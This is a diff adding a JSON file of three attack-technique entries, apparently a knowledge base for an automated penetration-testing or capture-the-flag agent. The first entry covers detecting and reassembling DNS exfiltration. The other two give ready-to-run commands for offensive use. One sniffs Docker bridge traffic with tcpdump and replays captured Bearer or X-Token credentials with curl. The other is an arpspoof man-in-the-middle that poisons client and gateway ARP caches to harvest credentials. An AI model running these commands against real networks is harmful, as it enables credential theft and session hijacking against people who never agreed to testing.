@@ -1,0 +1,89 @@
+[
+  {
+    "id": "dns-exfiltration-detection",
+    "title": "DNS Data Exfiltration Detection — Capture and Reassemble Encoded Data from DNS Queries",
+    "category": "EXFIL",
+    "subcategory": "DNS",
+    "description": "DNS exfiltration tunnels data by encoding it into subdomain labels of DNS queries (e.g. 'HEXDATA.exfil.attacker.com'). Since DNS (port 53/UDP) is rarely blocked by firewalls, attackers use it as a covert channel. Detection: (1) Use tcpdump to capture DNS queries: 'tcpdump -i eth0 -n udp port 53' or 'tcpdump -i eth0 -n -A udp port 53'. (2) Extract the encoded subdomain labels from captured queries. (3) Data is often hex-encoded with index markers like '00-HEXDATA' for ordering. (4) Sort by index, concatenate hex, decode: 'echo HEXDATA | xxd -r -p'. (5) Look for patterns: high frequency DNS queries to unusual domains, long subdomain labels (>50 chars), hexadecimal characters in subdomains. The flag may be split across multiple DNS queries and needs reassembly.",
+    "techniques": [
+      "Capture all DNS: tcpdump -i eth0 -n -A udp port 53 2>&1 | head -200",
+      "Capture with hex dump: tcpdump -i eth0 -n -X udp port 53 2>&1 | head -300",
+      "Filter by domain: tcpdump -i eth0 -n udp port 53 and host TARGET_DOMAIN",
+      "Extract subdomain labels from tcpdump ASCII output — look for patterns like '00-HEXDATA.exfil'",
+      "Sort captured fragments by index number, concatenate hex strings",
+      "Decode hex: echo '66756c6c5f7061636b6574' | xxd -r -p",
+      "Decode base64 (alternative encoding): echo 'BASE64STRING' | base64 -d",
+      "Check DNS query rate: tcpdump -i eth0 -n udp port 53 -c 50 (count burst of queries)",
+      "Analyze DNS query lengths — exfiltration queries typically have unusually long subdomain labels"
+    ],
+    "indicators": [
+      "High frequency DNS queries to unknown domains",
+      "Subdomain labels > 50 characters or containing hex characters",
+      "DNS queries to domains not associated with legitimate services",
+      "Unusual DNS query rate from a single container/host"
+    ],
+    "prerequisites": ["Network access to capture DNS traffic", "tcpdump installed on the capture host"],
+    "tools": ["tcpdump_capture", "shell_exec"],
+    "tags": ["dns", "exfiltration", "tunnel", "covert-channel", "network", "detection"],
+    "confidence": 0.85,
+    "mitre_attack": "T1048"
+  },
+  {
+    "id": "container-network-sniffing-token-replay",
+    "title": "Docker Bridge Network Sniffing — Token Capture and Replay Attack",
+    "category": "CREDENTIAL",
+    "subcategory": "Network",
+    "description": "Docker bridge networks expose all traffic between containers on the same network at Layer 2 — any container can see unencrypted HTTP traffic from other containers. Attack: (1) Use tcpdump to capture HTTP traffic on the shared bridge interface (typically eth0 inside the container). (2) Filter for HTTP requests containing authentication headers or tokens. (3) Extract the captured token/JWT/cookie from the packet payload. (4) Replay the token to access protected endpoints on the target service. Key insight: Docker bridge acts like a shared Ethernet segment — there is no traffic isolation between containers on the same network. Unlike modern cloud overlays (Calico, Cilium), the default bridge driver provides ZERO network-layer access control.",
+    "techniques": [
+      "Check shared network: ip addr show eth0; ip route show (confirm same subnet as target)",
+      "Capture HTTP traffic: tcpdump -i eth0 -n -A tcp port 80 2>&1 | head -200",
+      "Capture with hex for binary data: tcpdump -i eth0 -n -X tcp port 80 -c 100",
+      "Filter by target host: tcpdump -i eth0 -n -A host TARGET_IP and tcp port 80",
+      "Filter by source: tcpdump -i eth0 -n -A src host TARGET_IP and tcp port 80",
+      "Extract Authorization header from tcpdump -A output (look for 'Authorization:', 'X-Token:', 'Cookie:')",
+      "Extract JWT token: grep -oP 'Bearer \\K[^\"]+' or manually copy from tcpdump output",
+      "Replay captured token: curl -H 'Authorization: Bearer CAPTURED_TOKEN' http://TARGET_IP/protected_endpoint",
+      "Replay custom header token: curl -H 'X-Token: CAPTURED_TOKEN' http://TARGET_IP/secret",
+      "Check for mutual traffic: tcpdump -i eth0 -n host not MY_IP (all traffic not from own container)"
+    ],
+    "indicators": [
+      "Multiple containers on the same Docker network (docker ps shows same bridge network)",
+      "HTTP (non-HTTPS) traffic observed in tcpdump output on port 80",
+      "Authentication tokens in clear text (Bearer/JWT/X-Token headers)",
+      "Docker bridge network (docker0) — default networking driver has no isolation"
+    ],
+    "prerequisites": ["Network access to a shared Docker bridge network", "tcpdump installed", "Target service uses HTTP (not HTTPS) for inter-container communication"],
+    "tools": ["tcpdump_capture", "shell_exec", "curl_get"],
+    "tags": ["docker", "bridge", "sniffing", "token-replay", "network", "credential-access", "lateral-movement"],
+    "confidence": 0.9,
+    "mitre_attack": "T1040"
+  },
+  {
+    "id": "arp-spoofing-mitm-sniffing",
+    "title": "ARP Spoofing Man-in-the-Middle — Credential Interception via ARP Cache Poisoning",
+    "category": "CREDENTIAL",
+    "subcategory": "Network",
+    "description": "ARP spoofing (ARP cache poisoning) exploits the trust-based ARP protocol to redirect traffic between two hosts through the attacker's machine. The attacker sends forged ARP replies, poisoning the ARP cache of both Client and Server so that both send their traffic to the attacker's MAC address. Attack: (1) Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward (prevents traffic blackhole). (2) Use arpspoof to poison both Client and Server ARP caches simultaneously. (3) Use tcpdump to capture the redirected traffic. (4) Extract credentials or tokens from the captured HTTP/FTP/Telnet traffic. The arpspoof tool (from dsniff package) is the standard tool for this attack.",
+    "techniques": [
+      "Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward (ESSENTIAL — without this, traffic is blackholed)",
+      "Poison Client ARP cache: arpspoof -i eth0 -t CLIENT_IP GATEWAY_IP (tell Client: 'I am the Gateway')",
+      "Poison Server/Gateway ARP cache: arpspoof -i eth0 -t GATEWAY_IP CLIENT_IP (tell Gateway: 'I am the Client')",
+      "Capture redirected traffic: tcpdump -i eth0 -n -A host CLIENT_IP 2>&1 | head -200",
+      "Capture specific protocol: tcpdump -i eth0 -n -A tcp port 80 and host CLIENT_IP (HTTP only)",
+      "Verify ARP cache poisoning: arp -a (check that Client and Gateway MAC addresses match attacker's MAC)",
+      "Target credentials extraction from captured HTTP POST bodies or FTP/Telnet sessions",
+      "Stop poisoning when done: killall arpspoof"
+    ],
+    "indicators": [
+      "Shared Ethernet segment or Docker bridge network (containers on same subnet)",
+      "ARP table shows multiple IPs pointing to same MAC address (sign of poisoning)",
+      "HTTP/FTP/Telnet (non-encrypted) traffic between target hosts",
+      "ip_forward is enabled or can be enabled (no kernel restriction)"
+    ],
+    "prerequisites": ["Network access to shared Layer 2 segment", "arpspoof installed (dsniff package)", "Ability to enable IP forwarding", "Target traffic is unencrypted (HTTP/FTP/Telnet)"],
+    "tools": ["shell_exec", "tcpdump_capture"],
+    "tags": ["arp", "spoofing", "mitm", "sniffing", "network", "credential-access", "poisoning"],
+    "confidence": 0.85,
+    "mitre_attack": "T1557"
+  }
+]
